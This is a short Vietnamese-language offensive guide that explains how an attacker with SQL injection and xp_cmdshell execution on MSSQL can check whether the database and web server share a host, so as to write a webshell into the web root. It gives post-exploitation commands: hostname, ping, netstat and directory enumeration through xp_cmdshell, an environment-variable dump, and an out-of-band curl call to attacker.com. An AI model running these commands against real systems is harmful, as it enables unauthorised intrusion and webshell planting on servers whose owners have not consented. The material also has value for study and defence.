# Cách Nhận Diện Web và DB Cùng Chung Server (MSSQL)

Khi khai thác SQL Injection / Stacked Queries và có quyền thi hành OS Command (`xp_cmdshell` trong MSSQL), chúng ta cần xác minh xem Database và Web Server có nằm trên cùng một hệ thống (cùng chung server) hay không. Điều này quyết định liệu chúng ta có thể ghi Webshell trực tiếp vào thư mục web (Document Root) thông qua OS command hay không.

Dưới đây là các phương pháp nhận diện:

## 1. Dựa Vào Tên Hostname / Server Name
- **Cách thực hiện:** Truy vấn từ DB `SELECT @@SERVERNAME;` hoặc `SELECT HOST_NAME();` và ghi nhớ giá trị.
- Sau đó, thông qua RCE (`xp_cmdshell`), thực hiện lệnh OS: `hostname` (trên Windows/Linux).
- Đồng thời, xem các Error Message trên giao diện Web (nếu có lộ `SERVER_NAME` hoặc hostname ở Error Header/Footer) rồi so sánh cùng `@@SERVERNAME`.
- Nếu có quyền đọc file, có thể so sánh `/etc/hostname` với `@@SERVERNAME`.

## 2. Kiểm Tra Mạng (Network Ping / Netstat)
Từ Database (qua `xp_cmdshell`), Ping ngược về Web Server:
```sql
EXEC master..xp_cmdshell 'ping web.site.com'
-- hoặc nếu biết public IP của web server:
EXEC master..xp_cmdshell 'ping <Public_IP>'
```
- Nếu `ping web.site.com` resolve ra IP 127.0.0.1 hoặc chính IP của máy đang đứng -> DB và Web cùng Server.
- Kiểm tra các connection hiện tại: `EXEC master..xp_cmdshell 'netstat -an | findstr 80'` hoặc 443 xem server có đang listen port web hay không. Nếu có -> Khả năng cao Cùng Server.

## 3. Khảo Sát Thư Mục (Directory Enumeration)
Nếu chúng ta nghi ngờ cùng máy chủ, hãy tìm xem Document Root (thư mục chứa source code web) có nằm trên server DB hay không:
```sql
EXEC xp_cmdshell 'DIR C:\ /s /b | findstr "index.php"'
-- Hoặc tìm các thư mục web phổ biến
EXEC xp_cmdshell 'DIR C:\xampp\htdocs\'
EXEC xp_cmdshell 'DIR C:\inetpub\wwwroot\'
```
- Nếu tìm thấy file `index.php` hoặc Document Root, rất có thể DB và Web chung hệ thống.
- Nếu không tìm kiếm thấy bất kỳ thư mục/files liên quan đến máy chủ Web -> Khả năng khác máy chủ.

## 4. Kiểm Chuẩn Bằng Out-of-Band (OOB) HTTP/DNS Request
Gửi request HTTP/DNS từ DB về một server do Attacker kiểm soát (sử dụng `curl`, `wget`, hoặc `nslookup`):
- Sử dụng RCE (DB): `EXEC xp_cmdshell 'curl http://attacker.com/db_touch'`
- Sử dụng SSRF (Web): Tác động tới một chức năng tuỳ ý trên web gọi tới IP của Attacker: `http://attacker.com/web_touch`
- So sánh Source IP của `db_touch` và `web_touch` log được trên máy `attacker.com`. Nếu IP nguồn (Source IP) giống hệt nhau -> Dùng chung Server hoặc cùng xuất phát từ một Gateway/NAT (trong trường hợp NAT/Gateway thì cần kết hợp với Network Test ở trên).

## 5. Dấu hiệu trong các biến môi trường
Nếu bạn thực thi command trên DB:
```sql
EXEC xp_cmdshell 'set'
```
Kiểm tra kết quả trả về, nếu có các biến quy định môi trường web như `DOCUMENT_ROOT`, `IIS_USER_HOME`, `XAMPP_ROOT`... thì chứng tỏ đang chung một server.

--- 
**Kết luận lại:**
Tóm lại, cách đơn giản nhất thường là:
1. `ping localhost`/`ping web_url` -> check IP.
2. Tìm kiếm (search) Document Root của Web có tồn tại trên DB host không.
3. So sánh public/private IP gửi từ Web App và SQL server thông qua webhook (OOB).
